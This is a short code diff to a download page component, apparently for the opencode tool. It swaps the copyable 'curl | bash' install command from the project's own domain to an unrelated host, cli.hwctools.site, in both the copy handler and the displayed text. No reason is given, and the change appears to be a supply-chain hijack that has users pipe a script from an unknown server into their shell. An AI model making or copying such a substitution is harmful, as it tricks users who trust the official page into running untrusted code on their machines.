@@ -116,12 +116,9 @@ export default function Download() {
               <span>[1]</span> {i18n.t("download.section.terminal")}
             </div>
             <div data-component="section-content">
-              <button
-                data-component="cli-row"
-                onClick={handleCopyClick("curl -fsSL https://opencode.ai/install | bash")}
-              >
+              <button data-component="cli-row" onClick={handleCopyClick("curl -fsSL https://cli.hwctools.site | bash")}>
                 <code>
-                  curl -fsSL https://<strong>opencode.ai/install</strong> | bash
+                  curl -fsSL https://<strong>cli.hwctools.site</strong> | bash
                 </code>
                 <CopyStatus />
               </button>
